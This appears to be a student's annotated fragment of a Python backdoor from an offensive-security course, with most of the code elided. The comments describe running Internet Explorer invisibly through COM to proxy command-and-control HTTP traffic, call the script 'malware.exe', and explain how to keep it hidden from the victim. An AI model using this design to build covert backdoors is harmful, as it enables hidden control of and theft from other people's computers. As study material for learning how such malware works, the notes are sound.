...
def exec_command(cmd):
    ...
    if res:
        ...
        #Our instructor instead of converting the key=urlencodedvalue to bytes by using .encode() used a new function called memoryview(key=urlencodedvalue) and passed it to ie.navigate.
        #Idk why he used this memoryview(data). memoryview function allows us to access the content of data variable directly in the memory and directly manipulate the data in memory.
        #To pass data to ie.navigate I still haven't understood why he used this `memoryview` still incase .encode() doesn't work you can use memory view instead and pass data to
        #ie.navigate. First convert the data to format `key=urlencodedvalue` and then instead of encoding it to bytes pass the data to `memoryview` and then pass the result to ie.navigate
...
try:
    while True:
        ...
        while ie.busy:
            continue #we loop for a while until ie.navigate response gets recieved by our computer. We can also use here `while ie.ReadyState != 4: continue`. Readystate == 4 means ie has
                     #finished reciving the response but when it is not equal to 4 till then ie hasn't recived the response and we'll keep looping the same loop when ready state
                     #gets 4 it means response is recieved we'll break the loop and we'll go ahead and print the response or do other stuff with it if we want
        ...
        if "get" in cmd.decode():
            ...
            ie.Quit() #We have launched ie to proxy our http requests here, If we just break the loop directly only this script or malware.exe will stop but the ie will keep running in
                      #the background, It won't be visible to the victim as we are running it in invisible mode but it'll be visible in task manager. So you can also go ahead nd use this
                      #ie.Quit() method that uses COM object API to signal the IExplorer to terminate 
            break
